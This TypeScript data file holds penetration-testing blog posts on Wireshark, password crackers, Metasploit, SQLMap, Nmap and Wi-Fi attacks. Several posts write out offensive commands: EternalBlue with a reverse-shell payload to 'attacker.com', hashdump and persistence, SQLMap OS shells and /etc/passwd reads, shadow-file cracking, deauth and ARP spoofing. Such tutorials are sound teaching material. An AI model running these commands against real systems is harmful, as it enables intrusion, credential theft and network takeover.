/**
 * Blog content — the single source of truth.
 *
 * This data used to exist in three places: here (inside the client component),
 * src/lib/blog-posts.ts, and again inside BlogSection.tsx. Three copies drifted
 * exactly as three copies do. In one sweep that produced: two posts sharing a
 * title, four posts with no metadata at all (so they rendered with the blog
 * index's title and shipped no schema), and every post overstating its read
 * time by between five and eighteen times.
 *
 * So the data lives here, once, with no "use client" and no JSX, and everything
 * else derives from it.
 */

export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  readTime: number;
  date: string;
  author: string;
  excerpt: string;
  content: string;
  tags: string[];
}

/**
 * Minutes to read, computed from the post rather than asserted next to it.
 *
 * The hand-written numbers claimed 9 to 18 minutes for posts of 228 to 500
 * words — a "18 min read" label on roughly one minute of text. 225 words per
 * minute is the usual reading rate for technical prose; code blocks are
 * scanned rather than read, so they are counted at a third.
 */
export function estimateReadTime(content: string): number {
  const code = (content.match(/```[\s\S]*?```/g) || []).join(" ");
  const prose = content.replace(/```[\s\S]*?```/g, " ");
  const words = prose.split(/\s+/).filter(Boolean).length;
  const codeWords = code.split(/\s+/).filter(Boolean).length;
  return Math.max(1, Math.round((words + codeWords / 3) / 225));
}

export const BLOG_POSTS: Record<string, BlogPost> = {
  "mastering-wireshark": {
    slug: "mastering-wireshark",
    title: "Mastering Wireshark: Network Traffic Analysis Deep Dive",
    category: "Tools",
    readTime: 12,
    date: "2026-01-15",
    author: "Semih Kilic",
    excerpt: "Advanced packet capture and analysis techniques — from protocol dissection to identifying malicious traffic patterns in real-time.",
    tags: ["wireshark", "network-analysis", "packet-capture", "traffic-analysis"],
    content: `
## Introduction

Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level. In this deep dive, we'll cover advanced techniques that go beyond basic packet capture.

## Setting Up Capture Filters

Before capturing traffic, it's crucial to set up proper capture filters to reduce noise:

\`\`\`
# Capture only HTTP/HTTPS traffic
tcp port 80 or tcp port 443

# Capture traffic from a specific subnet
net 192.168.1.0/24

# Capture DNS queries only
udp port 53
\`\`\`

## Display Filters for Forensic Analysis

Once you have captured data, display filters help you isolate relevant packets:

\`\`\`
# Find HTTP POST requests (potential data exfiltration)
http.request.method == "POST"

# Find DNS queries to suspicious TLDs
dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

# Detect potential C2 beaconing (regular interval connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`

## Identifying Malicious Traffic Patterns

### 1. DNS Tunneling Detection
Look for unusually long DNS queries or high-frequency DNS requests to the same domain. DNS tunneling often uses TXT records with base64-encoded data.

### 2. Beaconing Analysis
C2 (Command and Control) traffic often shows regular intervals. Use the Statistics > Conversations feature to identify hosts with periodic connections.

### 3. Data Exfiltration Indicators
- Large outbound data transfers during off-hours
- Encrypted connections to non-standard ports
- HTTP POST requests with large payloads to unknown domains

## Protocol Dissection

Wireshark's protocol dissectors allow deep inspection of application-layer protocols. Custom dissectors can be written in Lua for proprietary protocols.

## TShark for Automated Analysis

For automated analysis pipelines, TShark (Wireshark's CLI) is invaluable:

\`\`\`bash
# Extract all HTTP URLs from a capture
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Count connections per source IP
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Export specific streams
tshark -r capture.pcap -Y "tcp.stream eq 5" -w stream5.pcap
\`\`\`

## Best Practices

1. **Always capture with proper authorization** — Unauthorized packet capture may violate laws
2. **Use ring buffers** for continuous monitoring to avoid disk space issues
3. **Encrypt your captures** as they may contain sensitive data
4. **Timestamp analysis** is crucial for incident response timelines
5. **Combine with other tools** like Zeek (Bro) for automated threat detection

## Conclusion

Mastering Wireshark requires practice and understanding of network protocols. Start with your own lab environment, analyze known-good traffic first, then gradually move to more complex scenarios. The key is understanding what "normal" looks like so you can identify anomalies.
    `,
  },
  "hashcat-vs-john": {
    slug: "hashcat-vs-john",
    title: "Hashcat vs John the Ripper: Password Cracking Compared",
    category: "Tools",
    readTime: 10,
    date: "2026-01-12",
    author: "Semih Kilic",
    excerpt: "GPU-accelerated password recovery showdown. Benchmarks, rule-based attacks, and choosing the right tool for the job.",
    tags: ["hashcat", "john-the-ripper", "password-cracking", "GPU"],
    content: `
## Overview

Password cracking is an essential skill in penetration testing. Two tools dominate this space: **Hashcat** (GPU-focused) and **John the Ripper** (CPU-focused with GPU support). Let's compare them head-to-head.

## GPU vs CPU Performance

| Hash Type | Hashcat (RTX 4090) | John the Ripper (CPU) | Speed Ratio |
|-----------|--------------------|-----------------------|-------------|
| MD5 | 164 GH/s | 850 MH/s | 193x |
| SHA-256 | 22 GH/s | 320 MH/s | 69x |
| bcrypt | 184 kH/s | 45 kH/s | 4x |
| NTLM | 300 GH/s | 1.2 GH/s | 250x |

## Attack Modes

### Hashcat Attack Modes
- **Dictionary Attack** (-a 0): Straight wordlist attack
- **Combination Attack** (-a 1): Combine two wordlists
- **Brute-Force** (-a 3): Mask-based attack
- **Rule-Based** (-a 0 -r rules): Apply transformation rules
- **Hybrid** (-a 6, -a 7): Wordlist + mask combinations

### John the Ripper Modes
- **Single Crack**: Uses login names and GECOS info
- **Wordlist**: Dictionary with optional rules
- **Incremental**: Brute-force with character frequency optimization
- **External**: Custom cracking modes via C-like config

## When to Use Which

**Choose Hashcat when:**
- You have a powerful GPU
- Cracking large hash lists
- Need maximum speed for common hash types
- Working with modern hash algorithms

**Choose John the Ripper when:**
- Working with exotic/uncommon hash formats
- Need automatic hash detection
- Running on servers without GPUs
- Need incremental mode's smart brute-force

## Practical Example

\`\`\`bash
# Hashcat: Crack NTLM hashes with rockyou
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John: Crack shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=All /etc/shadow

# Hashcat: Mask attack for 8-char passwords
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?s
\`\`\`

## Conclusion

Both tools are essential in a penetration tester's arsenal. Use Hashcat for raw GPU power and John for versatility. Many professionals use both in their workflows.
    `,
  },
  "owasp-top-10-2026": {
    slug: "owasp-top-10-2026",
    title: "OWASP Top 10 in 2026: What's Changed",
    category: "Security",
    readTime: 12,
    date: "2026-01-08",
    author: "Semih Kilic",
    excerpt: "An updated look at the most critical web application security risks and how to mitigate them with modern tools.",
    tags: ["OWASP", "web-security", "top-10", "application-security"],
    content: `
## The Evolving Threat Landscape

The OWASP Top 10 continues to evolve as web technologies advance. In 2026, several categories have shifted to reflect modern application architectures including microservices, serverless, and AI-integrated applications.

## Key Changes from 2021

### 1. AI/ML Security Risks (NEW)
With the proliferation of AI-powered applications, new attack vectors have emerged:
- **Prompt Injection** — Manipulating LLM inputs to bypass safety controls
- **Training Data Poisoning** — Compromising model training pipelines
- **Model Inversion** — Extracting sensitive training data from models

### 2. API Security Misconfigurations (Elevated)
APIs now account for over 80% of web traffic. Common issues include:
- Broken Object Level Authorization (BOLA)
- Excessive data exposure in API responses
- Missing rate limiting and resource quotas

### 3. Supply Chain Vulnerabilities (Elevated)
The software supply chain remains a critical attack surface:
- Dependency confusion attacks
- Compromised CI/CD pipelines
- Malicious package injection

## Mitigation Strategies

1. **Shift-Left Security**: Integrate security testing into CI/CD pipelines
2. **Zero Trust Architecture**: Never trust, always verify
3. **SBOM (Software Bill of Materials)**: Track all dependencies
4. **AI Security Testing**: Specialized tools for LLM applications
5. **API Gateway Security**: Centralized API protection

## Using CyberSec Pro for OWASP Testing

CyberSec Pro's automated scanning engine covers all OWASP Top 10 categories with tools like:
- **Nikto** for web server misconfiguration detection
- **SQLMap** for injection testing
- **OWASP ZAP** for comprehensive web app scanning
- **Nuclei** for template-based vulnerability detection

## Conclusion

Stay ahead of threats by continuously testing your applications against the latest OWASP guidelines. Automated tools combined with manual testing provide the best coverage.
    `,
  },
  "metasploit-zero-to-exploit": {
    slug: "metasploit-zero-to-exploit",
    title: "Getting Started with Metasploit: Architecture, Workflow and Meterpreter",
    category: "Tutorials",
    readTime: 15,
    date: "2026-01-05",
    author: "Semih Kilic",
    excerpt: "Hands-on walkthrough of the Metasploit Framework — modules, payloads, encoders, and post-exploitation techniques.",
    tags: ["metasploit", "exploitation", "penetration-testing", "post-exploitation"],
    content: `
## Getting Started with Metasploit

The Metasploit Framework is the world's most used penetration testing software. This tutorial walks you through from installation to your first exploit.

## Architecture Overview

Metasploit's modular architecture consists of:
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code that runs after exploitation (shells, Meterpreter)
- **Auxiliaries**: Scanning, fuzzing, and information gathering modules
- **Post-Exploitation**: Modules for privilege escalation, persistence, pivoting
- **Encoders**: Obfuscation to evade detection

## Basic Workflow

\`\`\`bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(ms17_010_eternalblue) > show options

# Set target and payload
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50

# Execute
msf6 > exploit
\`\`\`

## Meterpreter Post-Exploitation

Once you have a Meterpreter session:

\`\`\`bash
# System information
meterpreter > sysinfo

# Dump password hashes
meterpreter > hashdump

# Screenshot
meterpreter > screenshot

# Privilege escalation
meterpreter > getsystem

# Persistence
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

# Pivoting
meterpreter > run autoroute -s 10.0.0.0/24
\`\`\`

## Important: Legal & Ethical Considerations

**Always ensure you have written authorization before testing.** Unauthorized access to computer systems is illegal. Use dedicated lab environments or authorized bug bounty programs.

## Conclusion

Metasploit is an incredibly powerful framework. Master it in a controlled lab environment before using it in production assessments.
    `,
  },
  "ci-cd-pentest-automation": {
    slug: "ci-cd-pentest-automation",
    title: "Automating Penetration Tests with CI/CD",
    category: "DevSecOps",
    readTime: 10,
    date: "2026-01-03",
    author: "Semih Kilic",
    excerpt: "Integrate security testing into your development pipeline with CyberSec Pro's API and GitHub Actions.",
    tags: ["CI/CD", "automation", "DevSecOps", "GitHub-Actions"],
    content: `
## Why Automate Security Testing?

Manual penetration testing is thorough but slow. By integrating automated security scans into your CI/CD pipeline, you can:
- **Catch vulnerabilities early** in the development lifecycle
- **Reduce remediation costs** (fixing in dev is 10x cheaper than production)
- **Ensure continuous compliance** with security standards
- **Scale security testing** across multiple projects

## CyberSec Pro API Integration

\`\`\`yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger CyberSec Pro Scan
        run: |
          curl -X POST https://api.cyber-sec-pro.com/v1/scans \\
            -H "Authorization: Bearer \${{ secrets.CYBERSEC_API_KEY }}" \\
            -H "Content-Type: application/json" \\
            -d '{
              "target": "\${{ github.event.repository.homepage }}",
              "tool_id": "nikto",
              "options": {"tuning": "1234567890"}
            }'
\`\`\`

## Pipeline Architecture

1. **Pre-commit**: Secret scanning, dependency audit
2. **Build**: SAST (Static Analysis), container scanning
3. **Deploy (Staging)**: DAST (Dynamic Analysis) with CyberSec Pro
4. **Post-Deploy**: Continuous monitoring, vulnerability alerts

## Best Practices

- Never block deployments on informational findings
- Set severity thresholds (block on Critical/High only)
- Keep scan results in a centralized dashboard
- Automate ticket creation for new vulnerabilities
- Schedule weekly full scans in addition to pipeline scans

## Conclusion

DevSecOps is not optional — it's essential. Start small with automated dependency checks, then gradually add DAST and infrastructure scanning to your pipeline.
    `,
  },
  "wireless-security-assessment": {
    slug: "wireless-security-assessment",
    title: "Wireless Security Assessment Best Practices",
    category: "Wireless",
    readTime: 9,
    date: "2025-12-15",
    author: "Semih Kilic",
    excerpt: "Comprehensive guide to testing Wi-Fi network security using aircrack-ng, wifite, and bettercap.",
    tags: ["wireless", "WiFi", "aircrack-ng", "wifite", "bettercap"],
    content: `
## Wireless Security Testing Methodology

Wireless networks present unique attack surfaces. This guide covers the essential tools and techniques for assessing Wi-Fi security.

## Essential Tools

### Aircrack-ng Suite
The foundational toolkit for wireless assessment:

\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake for specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

### Wifite (Automated)
For rapid assessment of multiple networks:

\`\`\`bash
# Automated scan and attack
wifite --kill --no-reaver

# Target specific encryption
wifite --wpa --dict /path/to/wordlist.txt
\`\`\`

### Bettercap (MITM)
For man-in-the-middle testing:

\`\`\`bash
# Start bettercap
bettercap -iface wlan0

# ARP spoofing
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on

# DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on
\`\`\`

## Assessment Checklist

1. **Encryption Strength**: WPA3 > WPA2-AES > WPA2-TKIP > WEP (never use)
2. **SSID Security**: Disable SSID broadcast in sensitive environments
3. **Client Isolation**: Prevent lateral movement between wireless clients
4. **Rogue AP Detection**: Monitor for evil twin attacks
5. **802.1X/RADIUS**: Enterprise authentication for corporate networks

## Legal Warning

**Wireless testing must only be performed on networks you own or have explicit written permission to test.** Unauthorized wireless access is a criminal offense in most jurisdictions.

## Conclusion

Regular wireless security assessments are essential for any organization. Combine automated scanning with manual testing for comprehensive coverage.
    `,
  },

  "sqlmap-injection-guide": {
    slug: "sqlmap-injection-guide",
    title: "SQLMap: Automated SQL Injection Testing Guide",
    category: "Tools",
    readTime: 15,
    date: "2026-03-10",
    author: "Semih Kilic",
    excerpt: "Complete guide to using SQLMap for automated SQL injection detection and exploitation.",
    tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
    content: `
## Introduction

SQLMap is the world's most popular open-source SQL injection tool. It automates detection and exploitation of SQL injection vulnerabilities.

## Basic Scanning

- **Basic test:** sqlmap -u "https://target.com/page?id=1"
- **POST data:** sqlmap -u "https://target.com/login" --data="user=admin&pass=123"
- **Specific param:** sqlmap -u "https://target.com/page?id=1" -p id

## Database Enumeration

- **List databases:** sqlmap -u URL --dbs
- **List tables:** sqlmap -u URL -D mydb --tables
- **Dump table:** sqlmap -u URL -D mydb -T users --dump
- **Dump all:** sqlmap -u URL --dump-all

## Advanced Techniques

### Bypass WAF/IPS

- Use tamper scripts: --tamper=space2comment,between
- Randomize user-agent: --random-agent
- Use cookies: --cookie="session=abc123"

### OS Shell Access

- Get interactive shell: --os-shell
- Read local files: --file-read="/etc/passwd"

## Best Practices

1. Always get authorization before testing
2. Start with less intrusive tests using --level=1 --risk=1
3. Use --batch for automated scanning
4. Save your session with --session for resume capability
5. Test in a lab first to understand the tool

## Conclusion

SQLMap is essential for web application security testing. Master its capabilities and always use it responsibly.
    `,
  },
  "nmap-network-scanning": {
    slug: "nmap-network-scanning",
    title: "Nmap: Complete Network Scanning & Discovery Guide",
    category: "Tools",
    readTime: 14,
    date: "2026-02-28",
    author: "Semih Kilic",
    excerpt: "Master Nmap for network discovery, port scanning, service detection, and OS fingerprinting.",
    tags: ["nmap", "network-scanning", "port-scanning", "reconnaissance"],
    content: `
## Introduction

Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Every security professional must master Nmap.

## Basic Scanning

- **Quick scan:** nmap target.com
- **All ports:** nmap -p- target.com
- **Specific ports:** nmap -p 22,80,443 target.com
- **Port range:** nmap -p 1-1000 target.com

## Service Detection

- **Version detection:** nmap -sV target.com
- **Aggressive scan:** nmap -A target.com
- **HTTP servers:** nmap --script http-server-header target.com

## Scan Techniques

- **SYN scan (stealth):** nmap -sS target.com
- **TCP connect:** nmap -sT target.com
- **UDP scan:** nmap -sU target.com
- **Null scan:** nmap -sN target.com

## NSE Scripts

- **Default scripts:** nmap -sC target.com
- **Vuln scan:** nmap --script vuln target.com
- **HTTP enum:** nmap --script http-enum target.com
- **SSL check:** nmap --script ssl-enum-ciphers target.com

## Output Formats

- **Normal:** nmap -oN scan.txt target.com
- **XML:** nmap -oX scan.xml target.com
- **Grepable:** nmap -oG scan.grep target.com

## Conclusion

Nmap is the foundation of network security testing. Practice in your own lab and always obtain proper authorization.
    `,
  },
  "metasploit-exploitation": {
    slug: "metasploit-exploitation",
    title: "Metasploit Modules, Payloads and the Exploitation Workflow",
    category: "Tools",
    readTime: 18,
    date: "2026-02-15",
    author: "Semih Kilic",
    excerpt: "Complete walkthrough of Metasploit Framework — module types, exploit development, and post-exploitation.",
    tags: ["metasploit", "exploitation", "penetration-testing", "msfconsole"],
    content: `
## Introduction

Metasploit Framework is the world's most used penetration testing framework. It provides tools for every stage of a pentest.

## Getting Started

- **Start console:** msfconsole
- **Search exploits:** search type:exploit platform:windows smb
- **Use exploit:** use exploit/windows/smb/ms17_010_eternalblue
- **Show options:** show options
- **Set options:** set RHOSTS 192.168.1.100

## Module Types

### Exploits
- exploit/multi/handler — Generic listener
- exploit/windows/smb/ — Windows SMB exploits
- exploit/linux/http/ — Linux web exploits

### Payloads
- payload/windows/meterpreter/reverse_tcp — Windows
- payload/linux/x64/meterpreter/reverse_tcp — Linux
- payload/python/meterpreter/reverse_tcp — Cross-platform

## Exploitation Workflow

1. Find target: search type:exploit apache
2. Configure: set RHOSTS target.com
3. Set payload: set PAYLOAD linux/x64/meterpreter/reverse_tcp
4. Set listener: set LHOST attacker.com
5. Exploit: exploit

## Post-Exploitation

- **System info:** sysinfo, getuid
- **File ops:** download /etc/passwd, upload shell.sh
- **Network recon:** ifconfig, route, netstat
- **Privilege escalation:** getsystem

## Conclusion

Metasploit is powerful but must be used responsibly. Master the basics in a lab first.
    `,
  },
  "hashcat-password-cracking": {
    slug: "hashcat-password-cracking",
    title: "Hashcat: GPU-Accelerated Password Cracking Mastery",
    category: "Tools",
    readTime: 16,
    date: "2026-01-28",
    author: "Semih Kilic",
    excerpt: "Advanced Hashcat techniques for password auditing — hash modes, rule-based attacks, and optimization.",
    tags: ["hashcat", "password-cracking", "hash-cracking", "security-audit"],
    content: `
## Introduction

Hashcat is the world's fastest password recovery utility. It supports GPU acceleration and over 300 hash types.

## Hash Modes

- **MD5:** -m 0
- **NTLM:** -m 1000
- **SHA-256:** -m 1400
- **sha512crypt:** -m 1800
- **bcrypt:** -m 3200

## Attack Modes

### Dictionary Attack
- **Basic:** hashcat -m 0 -a 0 hashes.txt wordlist.txt
- **With rules:** hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

### Mask Attack
- **Unknown chars:** hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
  - ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special

### Hybrid Attack
- **Word + mask:** hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
- **Mask + word:** hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt

## Optimization

- **GPU selection:** -d 1
- **Speed optimization:** -O
- **Session management:** --session=mysession
- **Restore session:** --session=mysession --restore

## Conclusion

Hashcat is essential for password security auditing. Use it to verify password policies.
    `,
  },
};
